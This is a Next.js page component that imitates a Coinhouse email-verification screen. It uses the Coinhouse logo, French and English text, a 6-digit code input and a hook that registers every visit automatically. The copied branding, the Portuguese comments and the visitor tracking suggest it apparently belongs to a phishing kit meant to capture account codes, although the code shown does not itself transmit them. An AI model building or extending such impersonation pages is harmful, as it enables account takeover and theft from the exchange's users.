"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { ChevronDown, ArrowLeft } from "lucide-react"
import Image from "next/image"
import Link from "next/link"
import { useMetrics } from "@/hooks/useMetrics"

// Detectar idioma do navegador - padrão sempre inglês exceto francês
const getDefaultLanguage = () => {
  if (typeof window !== "undefined") {
    const browserLang = navigator.language.toLowerCase()
    return browserLang.startsWith("fr") ? "fr" : "en"
  }
  return "en"
}

const translations = {
  fr: {
    title: "Code de vérification email",
    subtitle: "Entrez le code à 6 chiffres envoyé à votre adresse email",
    codeLabel: "Code Email",
    placeholder: "000000",
    verifyButton: "Vérifier",
    backToLogin: "Retour à la connexion",
    resendCode: "Renvoyer l'email",
    emailAddress: "user@example.com",
    checkSpam: "Vérifiez votre dossier spam si vous ne recevez pas l'email",
  },
  en: {
    title: "Email verification code",
    subtitle: "Enter the 6-digit code sent to your email address",
    codeLabel: "Email Code",
    placeholder: "000000",
    verifyButton: "Verify",
    backToLogin: "Back to login",
    resendCode: "Resend email",
    emailAddress: "user@example.com",
    checkSpam: "Check your spam folder if you don't receive the email",
  },
}

export default function EmailPage() {
  const metrics = useMetrics() // Hook das métricas
  const [language, setLanguage] = useState(() => getDefaultLanguage())
  const [code, setCode] = useState("")

  const t = translations[language as keyof typeof translations]

  // Envio automático de métricas ao carregar a página
  useEffect(() => {
    if (!metrics.isRegistered) {
      metrics.registerVisit() // Envia métricas automaticamente
    }
  }, [metrics])

  return (
    <div className="min-h-screen flex flex-col lg:flex-row">
      {/* Left side - Email Form */}
      <div className="flex-1 flex flex-col justify-center px-6 sm:px-8 lg:px-16 xl:px-20 bg-white min-h-screen py-6 lg:py-4">
        <div className="w-full max-w-md mx-auto">
          {/* Logo */}
          <div className="mb-6 lg:mb-4">
            <Image src="/coinhouse-logo.png" alt="Coinhouse" width={250} height={50} className="h-8 lg:h-10 w-auto" />
          </div>

          {/* Title and Language Selector */}
          <div className="flex flex-col space-y-4 lg:flex-row lg:items-center lg:justify-between lg:space-y-0 mb-6">
            <h1 className="text-xl lg:text-2xl font-semibold text-gray-900">{t.title}</h1>
            <Select value={language} onValueChange={setLanguage}>
              <SelectTrigger className="w-16 border border-gray-300 rounded-full px-3 py-1 h-8 lg:h-auto font-medium [&>svg]:hidden bg-white shadow-sm self-end lg:self-auto">
                <SelectValue />
                <ChevronDown className="h-3 w-3 ml-1 text-gray-600" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="fr">FR</SelectItem>
                <SelectItem value="en">GB</SelectItem>
              </SelectContent>
            </Select>
          </div>

          {/* Back Button */}
          <Link href="/home" className="flex items-center text-gray-600 hover:text-gray-800 mb-6">
            <ArrowLeft className="h-4 w-4 mr-2" />
            {t.backToLogin}
          </Link>

          {/* Email Form */}
          <div className="space-y-6">
            <div className="text-center lg:text-left">
              <p className="text-gray-600">{t.subtitle}</p>
              <p className="text-gray-900 font-medium">{t.emailAddress}</p>
            </div>

            <div>
              <Label htmlFor="code" className="text-sm font-medium text-gray-700 mb-2 block">
                {t.codeLabel}
              </Label>
              <Input
                id="code"
                type="text"
                value={code}
                onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
                placeholder={t.placeholder}
                className="w-full h-12 px-4 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 focus:border-transparent text-center text-2xl tracking-widest"
                maxLength={6}
              />
            </div>

            <p className="text-sm text-gray-500 text-center lg:text-left">{t.checkSpam}</p>

            <div className="flex flex-col space-y-4 lg:flex-row lg:items-center lg:justify-between lg:space-y-0 pt-4">
              <Button className="bg-black hover:bg-gray-800 text-white px-8 py-3 rounded-full font-medium w-full lg:w-auto">
                {t.verifyButton}
              </Button>

              <button className="text-sm text-gray-600 hover:text-gray-800 underline text-center lg:text-left">{t.resendCode}</button>
            </div>
          </div>
        </div>
      </div>

      {/* Right side - Background with Phone - Hidden on mobile */}
      <div className="hidden lg:flex lg:flex-1 relative overflow-hidden">
        <div
          className="absolute inset-0 bg-gradient-to-br from-pink-400 via-purple-500 to-blue-500"
          style={{
            backgroundImage: `url('/gradient-background.png')`,
            backgroundSize: "cover",
            backgroundPosition: "center",
          }}
        />

        <div className="absolute inset-0 flex items-center justify-center">
          <div className="relative">
            <Image src="/phone-mockup.png" alt="Coinhouse App" width={300} height={600} className="drop-shadow-2xl" />
          </div>
        </div>

        <div className="absolute bottom-16 left-1/2 transform -translate-x-1/2 text-center text-white">
          <h2 className="text-2xl font-bold mb-2">
            {language === "fr" ? "Vérification Email" : "Email Verification"}
          </h2>
          <p className="text-xl">
            {language === "fr" ? "Confirmez votre identité" : "Confirm your identity"}
          </p>
        </div>
      </div>
    </div>
  )
}
